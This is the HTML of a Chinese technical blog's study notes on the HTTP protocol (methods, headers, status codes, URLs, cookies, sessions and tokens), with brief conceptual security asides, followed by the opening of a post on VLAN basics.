+          <a href="/2026/04/03/network-basic/2026-04-03-http/" class="post-title-link" itemprop="url">网络通讯协议—HTTP</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-04-03 22:00:00" itemprop="dateCreated datePublished" datetime="2026-04-03T22:00:00+08:00">2026-04-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-10-15 11:26:41" itemprop="dateModified" datetime="2026-10-15T11:26:41+08:00">2026-10-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/network/" itemprop="url" rel="index"><span itemprop="name">network</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/network/http/" itemprop="url" rel="index"><span itemprop="name">http</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="1-0-HTTP协议"><a href="#1-0-HTTP协议" class="headerlink" title="1.0 HTTP协议"></a>1.0 HTTP协议</h2><blockquote>
+<p>超文本传输协议, 使用一种用于消息的模型: (客户端发出一条请求消息, 由服务器返回一条响应消息)</p>
+</blockquote>
+<h3 id="1-1-请求-Request-报文"><a href="#1-1-请求-Request-报文" class="headerlink" title="1.1 请求(Request)报文"></a>1.1 请求(Request)报文</h3><p>所有HTTP消息(请求与响应)中都包含:</p>
+<ul>
+<li>1个或n个单行显示的消息头(header) 主要包含: 请求行信息和请求头信息;</li>
+<li>1个强制空白行;</li>
+<li>请求消息主体(可能存在);</li>
+</ul>
+<p><img data-src="/2026/04/03/network-basic/2026-04-03-http/2.png"></p>
+<h4 id="01-报文详解-请求行"><a href="#01-报文详解-请求行" class="headerlink" title="01 报文详解: 请求行"></a>01 报文详解: 请求行</h4><table>
+<thead>
+<tr>
+<th>序号</th>
+<th>参考内容</th>
+<th>解释说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>GET</td>
+<td>表示向服务端请求数据资源的方法</td>
+</tr>
+<tr>
+<td>2</td>
+<td>&#x2F;dz..227</td>
+<td>表示向服务端具体需要请求的资源信息</td>
+</tr>
+<tr>
+<td>3</td>
+<td>HTTP&#x2F;1.1</td>
+<td>表示和服务端进行HTTP通讯过程选择的协议版本</td>
+</tr>
+</tbody></table>
+<h4 id="02-请求方法"><a href="#02-请求方法" class="headerlink" title="02 请求方法"></a>02 请求方法</h4><p>GET: 从服务器<strong>获取</strong>资源。参数全部拼接在URL中，格式为<code>?key1=value1&amp;key2=value2</code></p>
+<p>POST: 向服务器<strong>提交</strong>数据，数据在请求体（Body）中，不在URL里。常见于登录、注册、文件上传、评论区</p>
+<p>HEAD: 与GET完全相同，但服务器只返回响应头，不返回响应体。用来快速判断一个URL是否存在、资源有多大，而不消耗大量带宽</p>
+<p>OPTIONS: 查询服务器对某个URL<strong>支持哪些HTTP请求方法</strong></p>
+<p>PUT: 向指定URL<strong>上传或更新</strong>资源。与POST不同，PUT是幂等的（多次相同请求结果一致），通常对应文件级别的操作</p>
+<p><strong>引申</strong>：这几个方法在测试里对应不同的入口。GET 与 POST 的差别只是参数放的位置，注入类漏洞的判断方式一致；OPTIONS 可以探测目标允许哪些方法；TRACE 会把请求原样回显给客户端，历史上被用来读取带 HttpOnly 标记的 Cookie；PUT 若被开启，往往意味着可以直接上传文件覆盖服务器上的现有资源。</p>
+<h4 id="03-报文详解-请求头"><a href="#03-报文详解-请求头" class="headerlink" title="03 报文详解: 请求头"></a>03 报文详解: 请求头</h4><h5 id="请求头字段解读-Accept"><a href="#请求头字段解读-Accept" class="headerlink" title="请求头字段解读: Accept"></a>请求头字段解读: Accept</h5><ul>
+<li>Accept 表示浏览器支持的MIME类型[斜杠&#x2F;前面的是类型(type); 斜杠&#x2F; 后面的是子类型(subtype)]</li>
+<li>type指定大范围,subtype是type中更明确的类型;</li>
+</ul>
+<p>常见的MIME类型:</p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>类型</th>
+<th>解释说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>01</td>
+<td>Text</td>
+<td>标准化展示文本信息,文本消息可以是多种字符集或者多种格式;</td>
+</tr>
+<tr>
+<td></td>
+<td>Text&#x2F;HTML</td>
+<td>表示HTML文档;</td>
+</tr>
+<tr>
+<td>02</td>
+<td>Application</td>
+<td>用于传输应用程序数据或者二进制数据;</td>
+</tr>
+<tr>
+<td></td>
+<td>application&#x2F;xhtml+xml</td>
+<td>xhtml文档;</td>
+</tr>
+<tr>
+<td></td>
+<td>application&#x2F;xml</td>
+<td>xml文档</td>
+</tr>
+</tbody></table>
+<h5 id="请求头字段解读-Referer"><a href="#请求头字段解读-Referer" class="headerlink" title="请求头字段解读: Referer"></a>请求头字段解读: Referer</h5><ul>
+<li><p>链接跳转</p>
+</li>
+<li><p>正确用途: 推广 , 引流</p>
+</li>
+<li><p>非法用途: 盗链访问</p>
+</li>
+</ul>
+<h5 id="请求头字段解读-Accept-Language"><a href="#请求头字段解读-Accept-Language" class="headerlink" title="请求头字段解读: Accept-Language"></a>请求头字段解读: Accept-Language</h5><ul>
+<li>表示浏览器可以支持的语言类型<ul>
+<li>q是权重系数(0≤q≤1) q越大,请求越倾向于;之前的类型;</li>
+<li>未指定默认 q &#x3D; 1;</li>
+<li>若q &#x3D; 0 提醒服务器不接受该类型.</li>
+</ul>
+</li>
+</ul>
+<h5 id="请求头字段解读-User-Agent"><a href="#请求头字段解读-User-Agent" class="headerlink" title="请求头字段解读: User-Agent"></a>请求头字段解读: User-Agent</h5><ul>
+<li>显示浏览器或其他生成该请求的客户端(软件)相关信息.</li>
+</ul>
+<h5 id="请求头字段解读-Host"><a href="#请求头字段解读-Host" class="headerlink" title="请求头字段解读: Host"></a>请求头字段解读: Host</h5><ul>
+<li>指定出现在被访问的完整URL中主机名称.</li>
+<li>若几个web站点以相同的一台服务器为主机,就需要使用Host消息头,因为请求第一行中URL通常不包含主机名称.</li>
+</ul>
+<h5 id="请求头字段解读-Cookie"><a href="#请求头字段解读-Cookie" class="headerlink" title="请求头字段解读: Cookie"></a>请求头字段解读: Cookie</h5><ul>
+<li>提交服务器向客户端发布的其他参数 识别用户信息</li>
+</ul>
+<h5 id="请求头字段解读-Connection"><a href="#请求头字段解读-Connection" class="headerlink" title="请求头字段解读: Connection"></a>请求头字段解读: Connection</h5><ul>
+<li>表示持久的客户端与服务连接<ul>
+<li>close: 关闭</li>
+<li>keep-alive 打开(保持活动)</li>
+</ul>
+</li>
+</ul>
+<h5 id="请求头字段解读-Upgrade-Insecure-Requests"><a href="#请求头字段解读-Upgrade-Insecure-Requests" class="headerlink" title="请求头字段解读: Upgrade-Insecure-Requests"></a>请求头字段解读: Upgrade-Insecure-Requests</h5><ul>
+<li>让浏览器自动升级请求,从 http -&gt; https</li>
+</ul>
+<h5 id="请求头字段解读-X-Forwarded-For"><a href="#请求头字段解读-X-Forwarded-For" class="headerlink" title="请求头字段解读: X-Forwarded-For"></a>请求头字段解读: X-Forwarded-For</h5><ul>
+<li>识别通过http代理或负载均衡方式连接到web服务器的客户端最原始IP地址的字段(包含真实IP)</li>
+<li>反向代理,与VPN作用相反</li>
+</ul>
+<h4 id="04-请求主体"><a href="#04-请求主体" class="headerlink" title="04 请求主体"></a>04 请求主体</h4><p>请求主体只在需要向服务器提交数据时出现，GET 请求没有主体，POST、PUT 请求才有。主体的格式由请求头 Content-Type 声明，服务器依据它选择解析方式。</p>
+<table>
+<thead>
+<tr>
+<th>Content-Type</th>
+<th>主体形态</th>
+<th>常见场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>application&#x2F;x-www-form-urlencoded</td>
+<td><code>username=admin&amp;password=123</code>，编码方式与 URL 查询串一致</td>
+<td>传统表单提交</td>
+</tr>
+<tr>
+<td>multipart&#x2F;form-data</td>
+<td>用分隔符 boundary 把各字段与文件拼接在一起</td>
+<td>带文件的表单，文件上传</td>
+</tr>
+<tr>
+<td>application&#x2F;json</td>
+<td><code>{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123&quot;}</code></td>
+<td>前后端分离项目的接口</td>
+</tr>
+</tbody></table>
+<ul>
+<li>Content-Length 声明主体的字节长度，服务器依靠它判断主体读到哪里结束</li>
+<li>主体的长度不受 URL 长度限制，所以 POST 能提交的数据比 GET 多得多</li>
+<li>主体的内容不写入浏览器历史，也不进代理服务器和 Web 服务器的访问日志；但 HTTP 是明文协议，抓包照样能看见</li>
+<li>请求头与请求主体之间必须隔一个强制空行，空行之后才是主体内容</li>
+</ul>
+<h3 id="1-2-响应-Response-报文"><a href="#1-2-响应-Response-报文" class="headerlink" title="1.2 响应(Response)报文"></a>1.2 响应(Response)报文</h3><p><img data-src="/2026/04/03/network-basic/2026-04-03-http/3.png"></p>
+<h4 id="01-报文详解-响应行-起始行"><a href="#01-报文详解-响应行-起始行" class="headerlink" title="01 报文详解: 响应行&#x2F;起始行"></a>01 报文详解: 响应行&#x2F;起始行</h4><table>
+<thead>
+<tr>
+<th>序号</th>
+<th>参考内容</th>
+<th>解释说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>01</td>
+<td>HTTP&#x2F;1.1</td>
+<td>表示和服务端进行HTTP通讯过程选择的协议版本</td>
+</tr>
+<tr>
+<td>02</td>
+<td>200</td>
+<td>请求结果数字状态码<br>200是最常用状态码;表示成功提交请求,正在返回请求资源</td>
+</tr>
+<tr>
+<td>03</td>
+<td>OK</td>
+<td>“原因” 进一步说明状态</td>
+</tr>
+</tbody></table>
+<p>HTTP响应报文中常见状态码:</p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>状态码类型</th>
+<th>解释说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>01</td>
+<td>1xx</td>
+<td>需要提供信息</td>
+</tr>
+<tr>
+<td>02</td>
+<td>2xx</td>
+<td>请求成功处理</td>
+</tr>
+<tr>
+<td>03</td>
+<td>3xx</td>
+<td>客户端被重定向到其它资源</td>
+</tr>
+<tr>
+<td>04</td>
+<td>4xx</td>
+<td>客户端请求包含某种错误</td>
+</tr>
+<tr>
+<td>05</td>
+<td>5xx</td>
+<td>服务端执行请求时遇到错误</td>
+</tr>
+</tbody></table>
+<p><strong>状态码信息：100 Continue</strong></p>
+<ul>
+<li>当客户端提交⼀个包含主体的请求时，将发送这个响应。<br>该响应表示已收到请求消息头，客户端应继续发送主体。请求完成后，再由服务器返回另⼀个响应。</li>
+</ul>
+<p><strong>状态码信息： 200 Ok</strong></p>
+<ul>
+<li>本状态码表示已成功提交请求，且响应主体中包含请求结果。</li>
+</ul>
+<p><strong>状态码信息：201 Created</strong></p>
+<ul>
+<li>PUT请求的响应返回这个状态码，表示请求已成功提交。</li>
+</ul>
+<p><strong>状态码信息：301 Moved Permanently</strong></p>
+<ul>
+<li>本状态码将浏览器永久重定向到另外⼀个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。</li>
+</ul>
+<p><strong>状态码信息：302 Found</strong></p>
+<ul>
+<li>本状态码将浏览器暂时重定向到另外⼀个在Location消息头中指定的URL。客户端应在随后的请求中恢复使用原始URL.</li>
+</ul>
+<p><strong>状态码信息：304 Not Modified</strong></p>
+<ul>
+<li>本状态码指示浏览器使用缓存中保存的所请求资源的副本。服务器使用If-Modified-Since与If-None-Match消息头确定客户端是否拥有最新版本的资源</li>
+</ul>
+<p><strong>状态码信息：401 Unauthorized</strong></p>
+<ul>
+<li>服务器在许可请求前要求HTTP进行身份验证。WWW-Authenticate消息头详细说明所支持的身份验证类型。</li>
+</ul>
+<p><strong>状态码信息：403 Forbidden</strong></p>
+<ul>
+<li>本状态码指出，不管是否通过身份验证，禁止任何人访问被请求的资源。</li>
+</ul>
+<p><strong>状态码信息：404 Not Found</strong></p>
+<ul>
+<li>本状态码表示所请求的资源并不存在。</li>
+</ul>
+<p><strong>状态码信息：405 Method Not Allowed</strong></p>
+<ul>
+<li>本状态码表示指定的URL不支持请求中使用的方法。例如，如果试图在不支持PUT方法的地方使用该方法，就会收到本状态码。</li>
+</ul>
+<p><strong>状态码信息：413 Request Entity Too Large</strong></p>
+<ul>
+<li>本状态码表示请求主体过长，服务器无法处理。</li>
+</ul>
+<p><strong>状态码信息：414 Request URI Too Long</strong></p>
+<ul>
+<li>与前⼀个响应类似，本状态码表示请求中的URL过长，服务器无法处理。</li>
+</ul>
+<p><strong>状态码信息：500 Internal Server Error</strong></p>
+<ul>
+<li><p>本状态码表示服务器在执行请求时遇到错误。</p>
+<p>当提交无法预料的输入、在应用程序处理过程中造成无法处理的错误时，通常会收到本状态码。<br>应该仔细检查服务器响应的所有内容，了解与错误性质有关的详情。</p>
+</li>
+</ul>
+<p><strong>状态码信息：503 Service Unavailable</strong></p>
+<ul>
+<li>本状态码表示尽管Web服务器运转正常，并且能够响应请求，但服务器访问的应用程序还是无法作出响应。应该进行核实，是否因为执行了某种行为而造成这个结果</li>
+</ul>
+<h4 id="02-报文详解-响应头"><a href="#02-报文详解-响应头" class="headerlink" title="02 报文详解: 响应头"></a>02 报文详解: 响应头</h4><h5 id="响应头字段解读-Server"><a href="#响应头字段解读-Server" class="headerlink" title="响应头字段解读: Server"></a>响应头字段解读: Server</h5><ul>
+<li>显示web服务器软件</li>
+</ul>
+<h5 id="响应头字段解读-Set-Cookie"><a href="#响应头字段解读-Set-Cookie" class="headerlink" title="响应头字段解读: Set-Cookie"></a>响应头字段解读: Set-Cookie</h5><ul>
+<li>消息头向浏览器发送另一个Cookie,随后向服务器发送的请求中由Cookie头携带.</li>
+</ul>
+<h5 id="响应头字段解读-Pragma"><a href="#响应头字段解读-Pragma" class="headerlink" title="响应头字段解读: Pragma"></a>响应头字段解读: Pragma</h5><ul>
+<li>指示浏览器不要将响应保存在缓存中.确保浏览器获取的都是最新内容</li>
+</ul>
+<h5 id="响应头字段解读-Content-Type"><a href="#响应头字段解读-Content-Type" class="headerlink" title="响应头字段解读: Content-Type"></a>响应头字段解读: Content-Type</h5><ul>
+<li>与请求头Accept对应,表示返回的资源类型</li>
+</ul>
+<h5 id="响应头字段解读-Content-Length"><a href="#响应头字段解读-Content-Length" class="headerlink" title="响应头字段解读: Content-Length"></a>响应头字段解读: Content-Length</h5><ul>
+<li>规定消息主体的字节长度</li>
+</ul>
+<h5 id="响应头字段解读-ETag"><a href="#响应头字段解读-ETag" class="headerlink" title="响应头字段解读: ETag"></a>响应头字段解读: ETag</h5><ul>
+<li>验证请求的资源是否发生了改变,如果未改变,则从浏览器缓存中读取,这样就不必再次下载请求.</li>
+</ul>
+<h5 id="响应头字段解读-Vary-Accept-Encoding"><a href="#响应头字段解读-Vary-Accept-Encoding" class="headerlink" title="响应头字段解读: Vary:Accept-Encoding"></a>响应头字段解读: Vary:Accept-Encoding</h5><ul>
+<li>表示网站一般启用了GZip压缩</li>
+</ul>
+<h5 id="响应头字段解读-Expires"><a href="#响应头字段解读-Expires" class="headerlink" title="响应头字段解读: Expires"></a>响应头字段解读: Expires</h5><ul>
+<li>作用于网页缓存相关字段,用来控制缓存信息的失效日期</li>
+</ul>
+<h4 id="03-响应主体"><a href="#03-响应主体" class="headerlink" title="03 响应主体"></a>03 响应主体</h4><p>响应主体是服务器返回的实际内容：HTML 页面、JSON 数据、图片的二进制流、文件下载数据等。它与响应头之间同样隔一个强制空行。</p>
+<p>两个与主体直接相关的响应头：Content-Type 说明主体的类型，浏览器据此决定是渲染成页面还是当成文件下载；Content-Length 说明主体的字节数。有些站点把出错页面也返回成 200，这时候判断请求是否失败的依据是主体内容，而不是状态码。</p>
+<h3 id="1-3-HTTP协议通讯名词解释"><a href="#1-3-HTTP协议通讯名词解释" class="headerlink" title="1.3 HTTP协议通讯名词解释"></a>1.3 HTTP协议通讯名词解释</h3><h4 id="01-URL-URI"><a href="#01-URL-URI" class="headerlink" title="01 URL&#x2F;URI"></a>01 URL&#x2F;URI</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">URL</span><span class="params">(Uniform Resource Locator)</span></span>统一资源定位符,是标识web资源的唯一标识符.</span><br><span class="line">URI 统一资源标识符,用来标识某些资源名称.</span><br></pre></td></tr></table></figure>
+
+<p>URI 是更大的集合，用”协议 + 位置”的方式标注资源的 URL 是它的一个子集。</p>
+<p>一个完整 URL 的组成：</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">scheme:</span>//userinfo<span class="variable">@host</span><span class="symbol">:port/path?query</span><span class="comment">#fragment</span></span><br><span class="line"></span><br><span class="line"> <span class="symbol">https:</span>//   <span class="symbol">user:</span>pwd@   www.example.com : <span class="number">443</span>  /admin/login.php  ?id=<span class="number">1</span>  <span class="comment">#top</span></span><br><span class="line">   协议      认证信息         主机         端口      资源路径        查询串  片段</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>部分</th>
+<th>作用</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>scheme 协议</td>
+<td>规定访问方式</td>
+<td>http、https、ftp</td>
+</tr>
+<tr>
+<td>host 主机</td>
+<td>域名或 IP 地址</td>
+<td><a href="http://www.example.com、10.0.0.101">www.example.com、10.0.0.101</a></td>
+</tr>
+<tr>
+<td>port 端口</td>
+<td>不写时取协议默认值，http 为 80，https 为 443</td>
+<td>:8080</td>
+</tr>
+<tr>
+<td>path 资源路径</td>
+<td>服务器上的具体资源</td>
+<td>&#x2F;admin&#x2F;login.php</td>
+</tr>
+<tr>
+<td>query 查询串</td>
+<td>以 ? 开始，多个参数用 &amp; 连接，参数为 key&#x3D;value 形式</td>
+<td>?id&#x3D;1&amp;page&#x3D;2</td>
+</tr>
+<tr>
+<td>fragment 片段</td>
+<td>以 # 开始，只在浏览器内部定位，不会发送给服务器</td>
+<td>#top</td>
+</tr>
+</tbody></table>
+<ul>
+<li>特殊字符要按百分号编码：空格 %20、斜杠 %2F、单引号 %27、井号 %23；不可打印的字节用两位十六进制表示，中文按 UTF-8 编码后逐字节转义</li>
+<li>端口和查询串是最先要看的两个位置：非默认端口意味着后面还有另一个服务，查询串是注入类漏洞最常见的落点</li>
+</ul>
+<h4 id="02-Cookie"><a href="#02-Cookie" class="headerlink" title="02 Cookie"></a>02 Cookie</h4><p>Cookie 是服务器保存在客户端上的一小段数据。响应头 Set-Cookie 下发，之后同一个域下的每次请求都由请求头 Cookie 带回去，服务器靠它认出这是同一个客户端。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 响应中由服务器下发</span></span><br><span class="line">Set-Cookie: <span class="attribute">sessionid</span>=8f3a9c1d; <span class="attribute">Path</span>=/; <span class="attribute">Domain</span>=example.com; <span class="attribute">Expires</span>=Wed, 21 Oct 2026 07:28:00 GMT; HttpOnly; Secure</span><br><span class="line"></span><br><span class="line"><span class="comment"># 之后客户端每次请求都带回</span></span><br><span class="line">Cookie: <span class="attribute">sessionid</span>=8f3a9c1d</span><br></pre></td></tr></table></figure>
+
+<p>Cookie 的常用属性：</p>
+<table>
+<thead>
+<tr>
+<th>属性</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Domain</td>
+<td>允许携带该 Cookie 的域名，不指定时默认为当前域名</td>
+</tr>
+<tr>
+<td>Path</td>
+<td>允许携带该 Cookie 的路径，默认为当前目录</td>
+</tr>
+<tr>
+<td>Expires &#x2F; Max-Age</td>
+<td>过期时间。两者都不设置就是会话 Cookie，关掉浏览器即失效</td>
+</tr>
+<tr>
+<td>Secure</td>
+<td>只在 HTTPS 连接上发送</td>
+</tr>
+<tr>
+<td>HttpOnly</td>
+<td>禁止 JavaScript 通过 document.cookie 读取</td>
+</tr>
+<tr>
+<td>SameSite</td>
+<td>是否允许跨站请求携带该 Cookie，取值 Strict &#x2F; Lax &#x2F; None，用来限制 CSRF</td>
+</tr>
+</tbody></table>
+<ul>
+<li>会话 Cookie 与持久 Cookie：关掉浏览器就消失的是会话 Cookie，带 Expires 或 Max-Age 的会写进磁盘，下次打开浏览器还在</li>
+<li>浏览器的容量限制大约是每个域名 50 个 Cookie，每个 4KB</li>
+<li>HttpOnly 只能挡住 JavaScript 直接读取，挡不住 XSS 借浏览器的手替攻击者发请求；会话 Cookie 被窃取后，攻击者不需要账号密码就能接管会话</li>
+</ul>
+<h4 id="03-Session"><a href="#03-Session" class="headerlink" title="03 Session"></a>03 Session</h4><p>Session 是服务端保存的状态。客户端第一次访问时服务端建一条会话记录并生成 SessionID，通过 Set-Cookie 把 SessionID 发给客户端；后续请求带着这个 ID，服务端在自己的存储（内存、文件、Redis）里找到对应记录，取出登录状态和权限信息。</p>
+<p>会话数据放在服务端，客户端手里只有一个不透明的 ID，所以改客户端上的值没有用（除非 ID 可预测，或者服务端校验不严）。</p>
+<h4 id="04-Token"><a href="#04-Token" class="headerlink" title="04 Token"></a>04 Token</h4><p>Token 是把状态信息本身交给客户端保管的做法，服务端不存会话。最典型的是 JWT：服务端把用户名、过期时间等信息编码进 Token 并签名，客户端在每次请求的 Authorization 头里带上。</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Authorization:</span> Bearer 服务端签发的令牌</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>服务端只验签名、不查存储，适合多台服务器横向扩展和前后端分离项目</li>
+<li>Token 通常放在 localStorage 或内存里，由前端代码显式加到请求头上，不再依赖浏览器的 Cookie 机制，因此也不会被浏览器自动携带</li>
+<li>代价是签发之后无法直接作废，只能等它过期，或者额外维护一份黑名单</li>
+</ul>
+<h4 id="05-Cookie、Session、Token-对比"><a href="#05-Cookie、Session、Token-对比" class="headerlink" title="05 Cookie、Session、Token 对比"></a>05 Cookie、Session、Token 对比</h4><table>
+<thead>
+<tr>
+<th></th>
+<th>Cookie</th>
+<th>Session</th>
+<th>Token</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>数据存放在哪</td>
+<td>客户端</td>
+<td>服务端</td>
+<td>客户端</td>
+</tr>
+<tr>
+<td>客户端保存的内容</td>
+<td>服务器下发的任意键值</td>
+<td>一个 SessionID</td>
+<td>签名后的完整凭证</td>
+</tr>
+<tr>
+<td>服务端是否需要存储</td>
+<td>不需要</td>
+<td>需要</td>
+<td>不需要</td>
+</tr>
+<tr>
+<td>怎么传给服务器</td>
+<td>浏览器自动带 Cookie 头</td>
+<td>同样靠 Cookie 携带 SessionID</td>
+<td>一般放请求头 Authorization，由前端代码添加</td>
+</tr>
+<tr>
+<td>跨域与多服务</td>
+<td>受同源策略限制</td>
+<td>依赖共享存储</td>
+<td>天然适合多服务</td>
+</tr>
+<tr>
+<td>JavaScript 能否读取</td>
+<td>HttpOnly 为真时不能</td>
+<td>同上</td>
+<td>通常可以</td>
+</tr>
+</tbody></table>
+<p><strong>重点:</strong></p>
+<p>1.常用请求方法</p>
+<p>2.请求头中常见字段信息</p>
+<p>3.状态码信息</p>
+<p>4.响应头部字段</p>
+<p>5.cookie token</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/04/02/network-basic/2026-04-02-vlan/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/private/icon1.png">
+      <meta itemprop="name" content="Byron">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Byron">
+      <meta itemprop="description" content="Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Byron">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/04/02/network-basic/2026-04-02-vlan/" class="post-title-link" itemprop="url">网络通讯协议—VLAN</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-04-02 22:00:00" itemprop="dateCreated datePublished" datetime="2026-04-02T22:00:00+08:00">2026-04-02</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-10-12 15:45:02" itemprop="dateModified" datetime="2026-10-12T15:45:02+08:00">2026-10-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/network/" itemprop="url" rel="index"><span itemprop="name">network</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/network/vlan/" itemprop="url" rel="index"><span itemprop="name">vlan</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="VLAN技术"><a href="#VLAN技术" class="headerlink" title="VLAN技术"></a>VLAN技术</h2><h3 id="1-0-VLAN-作用"><a href="#1-0-VLAN-作用" class="headerlink" title="1.0 VLAN 作用"></a>1.0 VLAN 作用</h3><ul>
+<li><p>VLAN(虚拟局域网技术)为以太网引入了灵活的控制手段</p>
+</li>
+<li><p>解决了传统局域网交换机以下问题</p>
+<ul>
+<li>安全性差，各个端口之间可以直接互访</li>
+<li>效率低，例如广播问题，消耗带宽和CPU资源</li>
+<li>业务扩展能力差，设备平等对待每台主机的报文，无法实现差别服务</li>
+</ul>
+</li>
+<li><p>VLAN技术作用</p>
+<ul>
+<li>将用户终端分成多个逻辑的网络组 （VLAN 1 VLAN 2 …）</li>
+<li>组内可以通讯，组间不允许通讯</li>
+<li>二层转发的 单播 组播 广播 报文只能在组内转发</li>
+<li>很容易实现对组成员添加，删除</li>
+</ul>
+</li>
+</ul>
+<h3 id="2-0-VLAN-通讯原理"><a href="#2-0-VLAN-通讯原理" class="headerlink" title="2.0 VLAN 通讯原理"></a>2.0 VLAN 通讯原理</h3><ul>
+<li><p>为实现转发控制，在待转发的以太网帧中添加VLAN标记（标记帧 tagged frame）</p>
+</li>
+<li><p>设定交换机端口对该标记帧进行以下处理</p>
+<ul>
+<li>丢弃帧</li>
+<li>转发帧</li>
+<li>添加标记</li>
+<li>移除标记</li>
+</ul>
+</li>
+<li><p>所有以太网帧在交换机中都以标记帧的形式流动</p>
+<ul>
+<li><p>即某端口从对端设备收到的帧有可能是 untagged frame（非标记帧）</p>
+</li>
+<li><p>但从本交换机其他端口转发过来的帧一定是 tagged frame</p>
+</li>
+<li><p>若收到 tagged frame 则进行转发</p>
+</li>
+<li><p>若收到 untagged frame 则必须加标记 &#x3D;&gt; (untagged &#x3D;&gt; tagged)</p>
+</li>
+</ul>
+</li>
+<li><p>VLAN 编号范围 0<del>4095 其中0和4095预留 实际:1</del>4094可用</p>
+</li>
+</ul>
+<h3 id="3-0-VLAN-接口类型"><a href="#3-0-VLAN-接口类型" class="headerlink" title="3.0  VLAN 接口类型"></a>3.0  VLAN 接口类型</h3><ul>
+<li><p><strong>Access</strong> 接口</p>
+<ul>
+<li>仅允许VLAN ID与接口的PVID相同数据帧通过</li>
+<li>接口收到设备发送帧为untagged，交换机强制对数据帧添加该接口的PVID</li>
+<li>接口发往对应主机的以太网帧永远是untagged</li>
+<li>多数交换机默认 接口类型是Access PVID &#x3D; 1，VLAN 1由系统创建，不能被删除</li>
+</ul>
+</li>
+<li><p><strong>Trunk</strong> 隧道接口类型 （用于连接交换机）</p>
+<ul>
+<li>交换机之间传输标记帧，可自由设定允许通过多个VLAN ID ID可以与PVID相同，也可不同</li>
+<li>若标记帧的VLAN ID 未配置，则丢弃帧</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-0-1-案例"><a href="#2-0-1-案例" class="headerlink" title="2.0.1 案例"></a>2.0.1 案例</h4><p>假设PC1中有一个以太网帧要向PC6传输，分析传输逻辑</p>
+<p><img data-src="/2026/04/02/network-basic/2026-04-02-vlan/VLAN%E6%8B%93%E6%89%91.png"></p>
